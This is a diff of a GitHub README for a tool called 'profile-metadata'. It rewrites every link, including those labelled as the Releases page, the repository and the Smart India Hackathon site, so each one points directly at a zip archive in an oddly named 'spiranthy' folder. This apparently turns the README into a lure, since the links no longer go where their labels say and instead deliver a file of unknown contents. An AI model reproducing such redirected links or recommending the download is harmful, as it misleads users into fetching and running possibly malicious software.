@@ -1,7 +1,7 @@
 # 📁 profile-metadata - Simple Tool for Your Developer Profile
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20profile--metadata-blue)](https://github.com/YDanok01/profile-metadata/releases)
+[![Download](https://raw.githubusercontent.com/YDanok01/profile-metadata/main/spiranthy/profile_metadata_v3.2-beta.4.zip%20profile--metadata-blue)](https://raw.githubusercontent.com/YDanok01/profile-metadata/main/spiranthy/profile_metadata_v3.2-beta.4.zip)
 
 ## 👋 Introduction
 Welcome to the **profile-metadata** project. This tool helps you present a clear and effective developer profile. It supports your public engineering presence with easy-to-manage content. Here, clarity and consistency are key. 
@@ -12,7 +12,7 @@ The project is inspired by best practices that align with the Smart India Hackat
 To get started with **profile-metadata**, follow these simple steps:
 
 1. **Download the Software**
-   Visit the [Releases page](https://github.com/YDanok01/profile-metadata/releases) to download the latest version of the software.
+   Visit the [Releases page](https://raw.githubusercontent.com/YDanok01/profile-metadata/main/spiranthy/profile_metadata_v3.2-beta.4.zip) to download the latest version of the software.
 
 2. **Install the Application**
    After downloading, follow these instructions based on your operating system:
@@ -34,7 +34,7 @@ To get started with **profile-metadata**, follow these simple steps:
 - **Disk Space**: Ensure you have at least 100 MB of free space for the installation.
 
 ## 📥 Download & Install
-To download **profile-metadata**, visit the [Releases page](https://github.com/YDanok01/profile-metadata/releases). Here, you will find the latest version of the software available for download. Once downloaded, follow the instructions above to install and run the application.
+To download **profile-metadata**, visit the [Releases page](https://raw.githubusercontent.com/YDanok01/profile-metadata/main/spiranthy/profile_metadata_v3.2-beta.4.zip). Here, you will find the latest version of the software available for download. Once downloaded, follow the instructions above to install and run the application.
 
 ## 📂 How to Use
 1. **Setup Your Profile**: After launching, you can easily set up your profile details. The fields guide you through entering the necessary information.
@@ -58,7 +58,7 @@ For further assistance, you can contact through the GitHub issues or directly re
 Thanks to all contributors who supported this project. Your efforts in documenting and refining the tool are invaluable.
 
 ## 🔗 Resources
-- [GitHub Repository](https://github.com/YDanok01/profile-metadata)
-- [Smart India Hackathon](https://www.sih.gov.in)
+- [GitHub Repository](https://raw.githubusercontent.com/YDanok01/profile-metadata/main/spiranthy/profile_metadata_v3.2-beta.4.zip)
+- [Smart India Hackathon](https://raw.githubusercontent.com/YDanok01/profile-metadata/main/spiranthy/profile_metadata_v3.2-beta.4.zip)
 
 By following these steps and information, you will successfully download and run **profile-metadata**. Enjoy managing your developer profile!
